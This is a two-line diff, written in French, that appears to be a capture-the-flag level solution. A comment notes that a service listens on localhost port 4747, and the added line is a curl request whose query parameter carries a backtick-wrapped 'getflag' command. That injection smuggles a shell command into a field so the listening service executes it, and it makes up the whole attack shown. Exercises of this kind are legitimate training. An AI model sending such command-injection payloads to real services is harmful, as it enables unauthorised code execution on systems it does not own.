@@ -1,0 +1,2 @@
+# On voit dans le fichier localhost 4747, on check avec netstat -ltu, on voit que le port est en ecoute.
+curl localhost:4747?x=\`getflag\`
